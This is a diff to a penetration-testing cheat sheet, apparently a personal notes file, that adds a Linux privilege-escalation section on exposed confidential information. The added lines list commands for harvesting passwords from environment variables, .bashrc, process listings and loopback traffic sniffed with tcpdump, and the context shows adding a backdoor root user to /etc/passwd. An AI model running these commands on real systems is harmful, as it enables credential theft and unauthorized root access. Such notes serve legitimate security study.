@@ -149,6 +149,7 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [Strategy](#strategy)
     - [Service Exploits](#service-exploits)
     - [Weak File Permissions](#weak-file-permissions)
+    - [Exposed Confidential Information](#exposed-confidential-information)
     - [Sudo](#sudo)
     - [Cron Jobs](#cron-jobs)
     - [SUID / SGID Executables](#suid--sgid-executables)
@@ -3758,6 +3759,15 @@ Note: HTTPTunnel uses both a client (`htc`) and a server (`hts`)
 - Substitute the root password hash with the new hash with `nano /etc/passwd`
   - or add a new root user to `/etc/passwd` with `echo "root2:<password hash>:0:0:root:/root:/bin/bash" >> /etc/passwd`
     - test the new user with `su root2` and `id`
+
+
+#### <ins>Exposed Confidential Information</ins>
+
+- `env` inspect environment variables
+- `cat .bashr` ispect .bashrc
+- `watch -n 1 "ps -aux | grep pass"` harvest active processes for credentials
+- `sudo tcpdump -i lo -A | grep "pass"` perform password sniffing
+
 
 #### <ins>Sudo</ins>
 
